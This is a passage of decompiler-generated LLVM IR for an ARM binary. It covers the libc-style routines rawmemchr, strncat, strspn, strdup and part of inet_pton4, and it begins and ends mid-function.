  %v1_1a9a8 = phi i1 [ %v1_1a9a8.pre, %bb ], [ %v9_1a99c, %dec_label_pc_1a99c ]
  %v0_1a9a8 = phi i1 [ %v0_1a9a8.pre, %bb ], [ %v3_1a99c, %dec_label_pc_1a99c ]
  %v2_1a9a8 = xor i1 %v1_1a9a8, true
  %v3_1a9a8 = and i1 %v0_1a9a8, %v2_1a9a8
  br i1 %v3_1a9a8, label %.dec_label_pc_1a9b0_crit_edge, label %dec_label_pc_1a9ac

.dec_label_pc_1a9b0_crit_edge:                    ; preds = %.thread7
  %v0_1a9b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9b0

dec_label_pc_1a9ac:                               ; preds = %entry, %dec_label_pc_1a970, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9b0

dec_label_pc_1a9b0:                               ; preds = %.dec_label_pc_1a9b0_crit_edge, %dec_label_pc_1a9ac
  %v0_1a9b0 = phi i32 [ %v0_1a9b0.pre, %.dec_label_pc_1a9b0_crit_edge ], [ 0, %dec_label_pc_1a9ac ]
  ret i32 %v0_1a9b0

; uselistorder directives
  uselistorder i1 %v9_1a99c, { 1, 0, 2 }
  uselistorder i32 %v1_1a99c, { 1, 0 }
  uselistorder i32 %v0_1a99c, { 0, 2, 1 }
  uselistorder i32 %v0_1a990.pre, { 2, 0, 1 }
  uselistorder i1 %v2_1a974, { 1, 0 }
  uselistorder i32 %v3_1a93c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1a99424.in, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1a9b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a9ac, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1a99c, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_1a93c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a9dc:
  %v1_1a9bc = urem i32 %arg1, 256
  store i32 %v1_1a9bc, i32* @lr, align 4
  %v4_1a9dc = mul nuw nsw i32 %v1_1a9bc, 256
  %v5_1a9dc = or i32 %v4_1a9dc, %v1_1a9bc
  %v4_1a9e4 = mul i32 %v5_1a9dc, 65536
  %v5_1a9e4 = or i32 %v4_1a9e4, %v5_1a9dc
  %v0_1a9e8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1a9e8

dec_label_pc_1a9e8:                               ; preds = %dec_label_pc_1aa54, %dec_label_pc_1a9e8, %dec_label_pc_1a9dc
  %v0_1a9e8 = phi i32 [ %v0_1a9e8.pre, %dec_label_pc_1a9dc ], [ %v4_1a9e8, %dec_label_pc_1a9e8 ], [ %v4_1a9e8, %dec_label_pc_1aa54 ]
  %v1_1a9e8 = inttoptr i32 %v0_1a9e8 to i32*
  %v2_1a9e8 = load i32, i32* %v1_1a9e8, align 4
  %v4_1a9e8 = add i32 %v0_1a9e8, 4
  store i32 %v4_1a9e8, i32* @ip, align 4
  %v2_1a9f0 = xor i32 %v2_1a9e8, %v5_1a9e4
  %v2_1a9f4 = add i32 %v2_1a9f0, 2130640639
  %v1_1a9fc = sub i32 -1, %v2_1a9f0
  %v2_1aa00 = xor i32 %v2_1a9f4, %v1_1a9fc
  %v2_1aa04 = and i32 %v2_1aa00, -2130640640
  %v2_1aa08 = icmp eq i32 %v2_1aa04, 0
  br i1 %v2_1aa08, label %dec_label_pc_1a9e8, label %dec_label_pc_1aa10

dec_label_pc_1aa10:                               ; preds = %dec_label_pc_1a9e8
  %v2_1aa10 = inttoptr i32 %v0_1a9e8 to i8*
  %v3_1aa10 = load i8, i8* %v2_1aa10, align 1
  %v4_1aa10 = zext i8 %v3_1aa10 to i32
  %v9_1aa18 = icmp eq i32 %v4_1aa10, %v1_1a9bc
  store i1 %v9_1aa18, i1* @cpsr_z, align 1
  %v1_1aa1c = add i32 %v0_1a9e8, 3
  %v1_1aa20 = add i32 %v0_1a9e8, 1
  %v1_1aa24 = add i32 %v0_1a9e8, 2
  br i1 %v9_1aa18, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1aa10
  ret i32 %v0_1a9e8

bb18:                                             ; preds = %dec_label_pc_1aa10
  %v2_1aa2c = inttoptr i32 %v1_1aa20 to i8*
  %v3_1aa2c = load i8, i8* %v2_1aa2c, align 1
  %v4_1aa2c = zext i8 %v3_1aa2c to i32
  %v9_1aa30 = icmp eq i32 %v4_1aa2c, %v1_1a9bc
  store i1 %v9_1aa30, i1* @cpsr_z, align 1
  br i1 %v9_1aa30, label %dec_label_pc_1aa38, label %dec_label_pc_1aa40

dec_label_pc_1aa38:                               ; preds = %bb18
  ret i32 %v1_1aa20

dec_label_pc_1aa40:                               ; preds = %bb18
  %v2_1aa40 = inttoptr i32 %v1_1aa24 to i8*
  %v3_1aa40 = load i8, i8* %v2_1aa40, align 1
  %v4_1aa40 = zext i8 %v3_1aa40 to i32
  %v9_1aa44 = icmp eq i32 %v4_1aa40, %v1_1a9bc
  store i1 %v9_1aa44, i1* @cpsr_z, align 1
  br i1 %v9_1aa44, label %dec_label_pc_1aa4c, label %dec_label_pc_1aa54

dec_label_pc_1aa4c:                               ; preds = %dec_label_pc_1aa40
  ret i32 %v1_1aa24

dec_label_pc_1aa54:                               ; preds = %dec_label_pc_1aa40
  %v2_1aa54 = inttoptr i32 %v1_1aa1c to i8*
  %v3_1aa54 = load i8, i8* %v2_1aa54, align 1
  %v4_1aa54 = zext i8 %v3_1aa54 to i32
  %v9_1aa58 = icmp eq i32 %v4_1aa54, %v1_1a9bc
  store i1 %v9_1aa58, i1* @cpsr_z, align 1
  br i1 %v9_1aa58, label %dec_label_pc_1aa60, label %dec_label_pc_1a9e8

dec_label_pc_1aa60:                               ; preds = %dec_label_pc_1aa54
  ret i32 %v1_1aa1c

; uselistorder directives
  uselistorder i32 %v4_1a9e8, { 2, 1, 0 }
  uselistorder i32 %v0_1a9e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1a9dc, { 1, 0 }
  uselistorder i32 %v1_1a9bc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1aa70 = load i32, i32* @r4, align 4
  store i32 %v3_1aa70, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1aa7c

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aa7c, %entry
  %v0_1aa7c = phi i32 [ %v5_1aa7c, %dec_label_pc_1aa7c ], [ %tmp, %entry ]
  %v1_1aa7c = inttoptr i32 %v0_1aa7c to i8*
  %v2_1aa7c = load i8, i8* %v1_1aa7c, align 1
  %v3_1aa7c = zext i8 %v2_1aa7c to i32
  store i32 %v3_1aa7c, i32* %ip.global-to-local, align 4
  %v5_1aa7c = add i32 %v0_1aa7c, 1
  store i32 %v5_1aa7c, i32* %r3.global-to-local, align 4
  %v2_1aa80 = icmp eq i8 %v2_1aa7c, 0
  store i1 %v2_1aa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aa80, label %dec_label_pc_1aa88, label %dec_label_pc_1aa7c

dec_label_pc_1aa88:                               ; preds = %dec_label_pc_1aa7c
  %v0_1aa88 = load i32, i32* %r2.global-to-local, align 4
  %v7_1aa88 = icmp eq i32 %v0_1aa88, 3
  store i1 %v7_1aa88, i1* %cpsr_z.global-to-local, align 1
  %v1_1aa8c = add i32 %v0_1aa7c, -1
  store i32 %v1_1aa8c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_1aa88, 4
  br i1 %tmp10, label %dec_label_pc_1ab20thread-pre-split, label %dec_label_pc_1aa94

dec_label_pc_1aa94:                               ; preds = %dec_label_pc_1aa88
  %v3_1aa94 = udiv i32 %v0_1aa88, 4
  store i32 %v3_1aa94, i32* %r0.global-to-local, align 4
  %v0_1aa98.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1aa98

dec_label_pc_1aa98:                               ; preds = %dec_label_pc_1aaf8, %dec_label_pc_1aa94
  %v2_1aaa0 = phi i32 [ %v1_1aaf0, %dec_label_pc_1aaf8 ], [ %v1_1aa8c, %dec_label_pc_1aa94 ]
  %v0_1aa98 = phi i32 [ %v1_1aaec, %dec_label_pc_1aaf8 ], [ %v0_1aa98.pre, %dec_label_pc_1aa94 ]
  %v1_1aa98 = inttoptr i32 %v0_1aa98 to i8*
  %v2_1aa98 = load i8, i8* %v1_1aa98, align 1
  %v3_1aa98 = zext i8 %v2_1aa98 to i32
  store i32 %v3_1aa98, i32* %r3.global-to-local, align 4
  %v2_1aa9c = icmp eq i8 %v2_1aa98, 0
  store i1 %v2_1aa9c, i1* %cpsr_z.global-to-local, align 1
  %v3_1aaa0 = add i32 %v2_1aaa0, 1
  %v4_1aaa0 = inttoptr i32 %v3_1aaa0 to i8*
  store i8 %v2_1aa98, i8* %v4_1aaa0, align 1
  %v0_1aaa4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1aaa4 = add i32 %v0_1aaa4, 1
  store i32 %v1_1aaa4, i32* %ip.global-to-local, align 4
  %v0_1aaa8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aaa8, label %.loopexit, label %dec_label_pc_1aaac

dec_label_pc_1aaac:                               ; preds = %dec_label_pc_1aa98
  %v0_1aaac = load i32, i32* @r1, align 4
  %v1_1aaac = add i32 %v0_1aaac, 1
  %v2_1aaac = inttoptr i32 %v1_1aaac to i8*
  %v3_1aaac = load i8, i8* %v2_1aaac, align 1
  %v4_1aaac = zext i8 %v3_1aaac to i32
  store i32 %v4_1aaac, i32* %r3.global-to-local, align 4
  %v2_1aab0 = icmp eq i8 %v3_1aaac, 0
  store i1 %v2_1aab0, i1* %cpsr_z.global-to-local, align 1
  %v3_1aab4 = add i32 %v0_1aaa4, 2
  %v4_1aab4 = inttoptr i32 %v3_1aab4 to i8*
  store i8 %v3_1aaac, i8* %v4_1aab4, align 1
  %v0_1aab8 = load i32, i32* @r1, align 4
  %v1_1aab8 = add i32 %v0_1aab8, 1
  store i32 %v1_1aab8, i32* %r1.global-to-local, align 4
  %v0_1aabc = load i32, i32* %ip.global-to-local, align 4
  %v1_1aabc = add i32 %v0_1aabc, 1
  store i32 %v1_1aabc, i32* %ip.global-to-local, align 4
  %v0_1aac0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aac0, label %.loopexit, label %dec_label_pc_1aac4

dec_label_pc_1aac4:                               ; preds = %dec_label_pc_1aaac
  %v1_1aac4 = add i32 %v0_1aab8, 2
  %v2_1aac4 = inttoptr i32 %v1_1aac4 to i8*
  %v3_1aac4 = load i8, i8* %v2_1aac4, align 1
  %v4_1aac4 = zext i8 %v3_1aac4 to i32
  store i32 %v4_1aac4, i32* %r3.global-to-local, align 4
  %v2_1aac8 = icmp eq i8 %v3_1aac4, 0
  store i1 %v2_1aac8, i1* %cpsr_z.global-to-local, align 1
  %v3_1aacc = add i32 %v0_1aabc, 2
  %v4_1aacc = inttoptr i32 %v3_1aacc to i8*
  store i8 %v3_1aac4, i8* %v4_1aacc, align 1
  %v0_1aad0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aad0 = add i32 %v0_1aad0, 1
  store i32 %v1_1aad0, i32* %r1.global-to-local, align 4
  %v0_1aad4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1aad4 = add i32 %v0_1aad4, 1
  store i32 %v1_1aad4, i32* %lr.global-to-local, align 4
  %v0_1aad8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aad8, label %.loopexit, label %dec_label_pc_1aadc

dec_label_pc_1aadc:                               ; preds = %dec_label_pc_1aac4
  %v1_1aadc = add i32 %v0_1aad0, 2
  %v2_1aadc = inttoptr i32 %v1_1aadc to i8*
  %v3_1aadc = load i8, i8* %v2_1aadc, align 1
  %v4_1aadc = zext i8 %v3_1aadc to i32
  store i32 %v4_1aadc, i32* %ip.global-to-local, align 4
  store i32 %v1_1aadc, i32* %r3.global-to-local, align 4
  %v2_1aae4 = icmp eq i8 %v3_1aadc, 0
  store i1 %v2_1aae4, i1* %cpsr_z.global-to-local, align 1
  %v3_1aae8 = add i32 %v0_1aad4, 2
  %v4_1aae8 = inttoptr i32 %v3_1aae8 to i8*
  store i8 %v3_1aadc, i8* %v4_1aae8, align 1
  %v0_1aaec = load i32, i32* %r3.global-to-local, align 4
  %v1_1aaec = add i32 %v0_1aaec, 1
  store i32 %v1_1aaec, i32* @r1, align 4
  %v0_1aaf0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1aaf0 = add i32 %v0_1aaf0, 1
  store i32 %v1_1aaf0, i32* %lr.global-to-local, align 4
  %v0_1aaf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aaf4, label %.loopexit, label %dec_label_pc_1aaf8

dec_label_pc_1aaf8:                               ; preds = %dec_label_pc_1aadc
  %v0_1aaf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1aaf8 = add i32 %v0_1aaf8, -1
  store i32 %v1_1aaf8, i32* %r0.global-to-local, align 4
  %v7_1aaf8 = icmp eq i32 %v0_1aaf8, 1
  store i1 %v7_1aaf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aaf8, label %dec_label_pc_1ab00, label %dec_label_pc_1aa98

dec_label_pc_1ab00:                               ; preds = %dec_label_pc_1aaf8
  %v0_1ab00 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ab00 = urem i32 %v0_1ab00, 4
  store i32 %v1_1ab00, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ab20

dec_label_pc_1ab08:                               ; preds = %dec_label_pc_1ab20
  %v0_1ab08 = load i32, i32* @r1, align 4
  %v1_1ab08 = inttoptr i32 %v0_1ab08 to i8*
  %v2_1ab08 = load i8, i8* %v1_1ab08, align 1
  %v3_1ab08 = zext i8 %v2_1ab08 to i32
  store i32 %v3_1ab08, i32* %ip.global-to-local, align 4
  %v2_1ab0c = icmp eq i8 %v2_1ab08, 0
  store i1 %v2_1ab0c, i1* %cpsr_z.global-to-local, align 1
  %v1_1ab10 = add i32 %v1_1ab2c, -1
  store i32 %v1_1ab10, i32* %r2.global-to-local, align 4
  %v3_1ab14 = add i32 %v3_1ab2c, 1
  %v4_1ab14 = inttoptr i32 %v3_1ab14 to i8*
  store i8 %v2_1ab08, i8* %v4_1ab14, align 1
  %v5_1ab14 = load i32, i32* %lr.global-to-local, align 4
  %v6_1ab14 = add i32 %v5_1ab14, 1
  store i32 %v6_1ab14, i32* %lr.global-to-local, align 4
  %v0_1ab18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ab18, label %.loopexit, label %dec_label_pc_1ab1c

dec_label_pc_1ab1c:                               ; preds = %dec_label_pc_1ab08
  %v0_1ab1c = load i32, i32* @r1, align 4
  %v1_1ab1c = add i32 %v0_1ab1c, 1
  store i32 %v1_1ab1c, i32* @r1, align 4
  %v0_1ab20.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ab20thread-pre-split

dec_label_pc_1ab20thread-pre-split:               ; preds = %dec_label_pc_1ab1c, %dec_label_pc_1aa88
  %v2_1ab146 = phi i32 [ %v6_1ab14, %dec_label_pc_1ab1c ], [ %v1_1aa8c, %dec_label_pc_1aa88 ]
  %v0_1ab20.pr = phi i32 [ %v0_1ab20.pr.pre, %dec_label_pc_1ab1c ], [ %v0_1aa88, %dec_label_pc_1aa88 ]
  br label %dec_label_pc_1ab20

dec_label_pc_1ab20:                               ; preds = %dec_label_pc_1ab20thread-pre-split, %dec_label_pc_1ab00
  %v3_1ab2c = phi i32 [ %v2_1ab146, %dec_label_pc_1ab20thread-pre-split ], [ %v1_1aaf0, %dec_label_pc_1ab00 ]
  %v1_1ab2c = phi i32 [ %v0_1ab20.pr, %dec_label_pc_1ab20thread-pre-split ], [ %v1_1ab00, %dec_label_pc_1ab00 ]
  %v2_1ab20 = icmp eq i32 %v1_1ab2c, 0
  store i1 %v2_1ab20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab20, label %dec_label_pc_1ab28, label %dec_label_pc_1ab08

dec_label_pc_1ab28:                               ; preds = %dec_label_pc_1ab20
  %v0_1ab28 = load i32, i32* %ip.global-to-local, align 4
  %v2_1ab28 = icmp eq i32 %v0_1ab28, 0
  store i1 %v2_1ab28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab28, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_1ab28
  %v4_1ab2c = add i32 %v3_1ab2c, 1
  %v5_1ab2c = inttoptr i32 %v4_1ab2c to i8*
  store i8 0, i8* %v5_1ab2c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1aadc, %dec_label_pc_1aac4, %dec_label_pc_1aaac, %dec_label_pc_1aa98, %dec_label_pc_1ab08, %dec_label_pc_1ab28, %bb
  %v0_1ab30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1ab30, i32* %r0.global-to-local, align 4
  %v2_1ab34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ab34, i32* @r4, align 4
  ret i32 %v0_1ab30

; uselistorder directives
  uselistorder i32 %v1_1ab2c, { 1, 0 }
  uselistorder i32 %v1_1ab00, { 1, 0 }
  uselistorder i32 %v0_1aaf8, { 1, 0 }
  uselistorder i32 %v1_1aaf0, { 0, 2, 1 }
  uselistorder i32 %v1_1aaec, { 1, 0 }
  uselistorder i32 %v0_1aa88, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1aa7c, { 1, 0 }
  uselistorder i32 %v0_1aa7c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_1ab702 = load i32, i32* @r0, align 4
  %v1_1ab703 = inttoptr i32 %v0_1ab702 to i8*
  %v2_1ab704 = load i8, i8* %v1_1ab703, align 1
  %v2_1ab746 = icmp eq i8 %v2_1ab704, 0
  br i1 %v2_1ab746, label %dec_label_pc_1ab80, label %dec_label_pc_1ab4c.preheader

dec_label_pc_1ab44:                               ; preds = %dec_label_pc_1ab4c
  %v1_1ab54 = add i32 %v0_1ab54, 1
  %v9_1ab44 = icmp eq i8 %v0_1ab60.in, %v2_1ab4c
  br i1 %v9_1ab44, label %dec_label_pc_1ab60, label %dec_label_pc_1ab4c

dec_label_pc_1ab4c:                               ; preds = %dec_label_pc_1ab4c.preheader, %dec_label_pc_1ab44
  %v0_1ab54 = phi i32 [ %tmp, %dec_label_pc_1ab4c.preheader ], [ %v1_1ab54, %dec_label_pc_1ab44 ]
  %v1_1ab4c = inttoptr i32 %v0_1ab54 to i8*
  %v2_1ab4c = load i8, i8* %v1_1ab4c, align 1
  %v3_1ab4c = zext i8 %v2_1ab4c to i32
  store i32 %v3_1ab4c, i32* @ip, align 4
  %v2_1ab50 = icmp eq i8 %v2_1ab4c, 0
  br i1 %v2_1ab50, label %dec_label_pc_1ab80, label %dec_label_pc_1ab44

dec_label_pc_1ab60:                               ; preds = %dec_label_pc_1ab44
  %v2_1ab60 = icmp eq i8 %v0_1ab60.in, 0
  br i1 %v2_1ab60, label %dec_label_pc_1ab80, label %dec_label_pc_1ab68

dec_label_pc_1ab68:                               ; preds = %dec_label_pc_1ab60
  %v1_1ab68 = add i32 %v0_1ab68, 1
  store i32 %v1_1ab68, i32* @lr, align 4
  %v1_1ab6c = add i32 %v0_1ab6c, 1
  %v1_1ab70 = inttoptr i32 %v1_1ab6c to i8*
  %v2_1ab70 = load i8, i8* %v1_1ab70, align 1
  %v2_1ab74 = icmp eq i8 %v2_1ab70, 0
  br i1 %v2_1ab74, label %dec_label_pc_1ab80, label %dec_label_pc_1ab4c.preheader

dec_label_pc_1ab4c.preheader:                     ; preds = %entry, %dec_label_pc_1ab68
  %v0_1ab6c = phi i32 [ %v1_1ab6c, %dec_label_pc_1ab68 ], [ %v0_1ab702, %entry ]
  %v0_1ab68 = phi i32 [ %v1_1ab68, %dec_label_pc_1ab68 ], [ 0, %entry ]
  %v0_1ab60.in = phi i8 [ %v2_1ab70, %dec_label_pc_1ab68 ], [ %v2_1ab704, %entry ]
  br label %dec_label_pc_1ab4c

dec_label_pc_1ab80:                               ; preds = %dec_label_pc_1ab60, %dec_label_pc_1ab68, %dec_label_pc_1ab4c, %entry
  %v0_1ab80 = phi i32 [ 0, %entry ], [ %v0_1ab68, %dec_label_pc_1ab4c ], [ %v1_1ab68, %dec_label_pc_1ab68 ], [ %v0_1ab68, %dec_label_pc_1ab60 ]
  ret i32 %v0_1ab80

; uselistorder directives
  uselistorder i8 %v0_1ab60.in, { 1, 0 }
  uselistorder i8 %v2_1ab4c, { 1, 2, 0 }
  uselistorder i32 %v0_1ab54, { 1, 0 }
  uselistorder label %dec_label_pc_1ab80, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1ab4c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_1ab88 = load i32, i32* @r4, align 4
  store i32 %v3_1ab88, i32* %stack_var_-12, align 4
  %v6_1ab88 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_1ab90 = call i32 @strlen(i8* %arg1)
  %v1_1ab94 = add i32 %v3_1ab90, 1
  store i32 %v1_1ab94, i32* @r4, align 4
  %v1_1ab9c = call i32 @malloc(i32 %v1_1ab94)
  store i32 109488, i32* @lr, align 4
  %v1_1abac = icmp ne i32 %v1_1ab9c, 0
  call void @__pseudo_cond_branch(i1 %v1_1abac, i32 ptrtoint (i32* @global_var_15710.1524 to i32))
  %v2_1abb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1abb4, i32* @r4, align 4
  store i32 %v6_1ab88, i32* @r5, align 4
  ret i32 %v1_1ab9c

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 3, 2 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_1abb8 = load i32, i32* @r5, align 4
  %v2_1abc0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_1abc0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_1ac483 = load i8, i8* %arg1, align 1
  %v3_1ac484 = zext i8 %v2_1ac483 to i32
  %v5_1ac485 = add i32 %tmp, 1
  store i32 %v5_1ac485, i32* @r4, align 4
  %v2_1ac4c6 = icmp eq i8 %v2_1ac483, 0
  store i1 %v2_1ac4c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac4c6, label %dec_label_pc_1ac58, label %dec_label_pc_1abe0

dec_label_pc_1abe0:                               ; preds = %entry, %dec_label_pc_1ac48.backedge
  %v0_1ac24 = phi i32 [ %v3_1ac48, %dec_label_pc_1ac48.backedge ], [ %v3_1ac484, %entry ]
  %v1_1ac5010.in = phi i32 [ %v3_1ac48, %dec_label_pc_1ac48.backedge ], [ %v3_1ac484, %entry ]
  %v1_1ac5010 = add nsw i32 %v1_1ac5010.in, -48
  %v2_1abe0 = icmp ugt i32 %v1_1ac5010, 8
  %v7_1abe0 = icmp eq i32 %v1_1ac5010, 9
  store i1 %v7_1abe0, i1* %cpsr_z.global-to-local, align 1
  %v2_1abe8 = xor i1 %v7_1abe0, true
  %v3_1abe8 = and i1 %v2_1abe0, %v2_1abe8
  br i1 %v3_1abe8, label %dec_label_pc_1ac24, label %dec_label_pc_1abec

dec_label_pc_1abec:                               ; preds = %dec_label_pc_1abe0
  %v0_1abec = load i32, i32* %r0.global-to-local, align 4
  %v1_1abec = inttoptr i32 %v0_1abec to i8*
  %v2_1abec = load i8, i8* %v1_1abec, align 1
  %v3_1abec = zext i8 %v2_1abec to i32
  %v3_1abf4 = mul nuw nsw i32 %v3_1abec, 10
  %v4_1abf4 = add nuw nsw i32 %v3_1abf4, %v0_1ac24
  %v1_1abf8 = add nsw i32 %v4_1abf4, -48
  %v2_1abfc = icmp ugt i32 %v1_1abf8, 254
  %v7_1abfc = icmp eq i32 %v1_1abf8, 255
  store i1 %v7_1abfc, i1* %cpsr_z.global-to-local, align 1
  %v2_1ac00 = xor i1 %v7_1abfc, true
  %v3_1ac00 = and i1 %v2_1abfc, %v2_1ac00
  br i1 %v3_1ac00, label %dec_label_pc_1ac7c, label %dec_label_pc_1ac04

dec_label_pc_1ac04:                               ; preds = %dec_label_pc_1abec
  %v0_1ac04 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ac04 = icmp eq i32 %v0_1ac04, 0
  store i1 %v2_1ac04, i1* %cpsr_z.global-to-local, align 1
  %v1_1ac08 = trunc i32 %v1_1abf8 to i8
  store i8 %v1_1ac08, i8* %v1_1abec, align 1
  %v0_1ac0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac0c, label %dec_label_pc_1ac10, label %dec_label_pc_1ac48.backedge

dec_label_pc_1ac10:                               ; preds = %dec_label_pc_1ac04
  %v0_1ac10 = load i32, i32* @lr, align 4
  %v1_1ac10 = add i32 %v0_1ac10, 1
  store i32 %v1_1ac10, i32* @lr, align 4
  %v7_1ac14 = icmp eq i32 %v1_1ac10, 4
  store i1 %v7_1ac14, i1* %cpsr_z.global-to-local, align 1
  %v0_1ac18 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac18 = add i32 %v0_1ac18, 1
  store i32 %v1_1ac18, i32* %r1.global-to-local, align 4
  %v8_1ac1c = icmp sgt i32 %v1_1ac10, 4
  br i1 %v8_1ac1c, label %dec_label_pc_1ac7c, label %dec_label_pc_1ac48.backedge

dec_label_pc_1ac24:                               ; preds = %dec_label_pc_1abe0
  %v7_1ac24 = icmp eq i32 %v0_1ac24, 46
  store i1 %v7_1ac24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac24, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1ac24
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ac7c

bb:                                               ; preds = %dec_label_pc_1ac24
  %v1_1ac2c = load i32, i32* %r1.global-to-local, align 4
  %v2_1ac2c = urem i32 %v1_1ac2c, 2
  %v2_1ac30 = icmp eq i32 %v2_1ac2c, 0
  store i1 %v2_1ac30, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_1ac30, label %dec_label_pc_1ac7c, label %dec_label_pc_1ac3c

dec_label_pc_1ac3c:                               ; preds = %bb
  %v0_1ac3c = load i32, i32* @lr, align 4
  %v7_1ac3c = icmp eq i32 %v0_1ac3c, 4
  store i1 %v7_1ac3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac3c, label %dec_label_pc_1ac7c, label %dec_label_pc_1ac44

dec_label_pc_1ac44:                               ; preds = %dec_label_pc_1ac3c
  %v2_1ac44 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ac44 = add i32 %v2_1ac44, 1
